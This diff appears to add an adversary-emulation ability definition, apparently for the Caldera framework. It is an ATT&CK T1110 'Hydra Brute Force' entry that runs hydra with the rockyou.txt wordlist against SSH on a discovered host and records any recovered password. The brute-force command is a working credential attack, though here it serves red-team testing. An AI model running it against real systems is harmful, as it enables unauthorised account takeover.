@@ -1,0 +1,27 @@
+---
+
+- id: f3f6df4d-37cd-43e6-bb2a-693e84e255c6
+  name: Hydra Brute Force
+  description: Brute Force on password with Hydra and worldlist
+  tactic: credential-access
+  technique:
+    attack_id: T1110 
+    name: Brute Force
+  platforms:
+    linux:
+      sh:
+        command: |
+          hydra -l #{comp.user.name} -P ./rockyou.txt ssh://#{comp.host.name} -t 4; 
+          echo "ok";
+  
+        payload: rockyou.txt
+
+        parsers:
+          plugins.stockpile.app.parsers.hydra:
+            - source:  comp.user.name
+            - edge: has_password
+            - target: comp.user.password
+
+  requirements:
+    plugins.stockpile.app.requirements.basic:
+      - source: comp.user.name
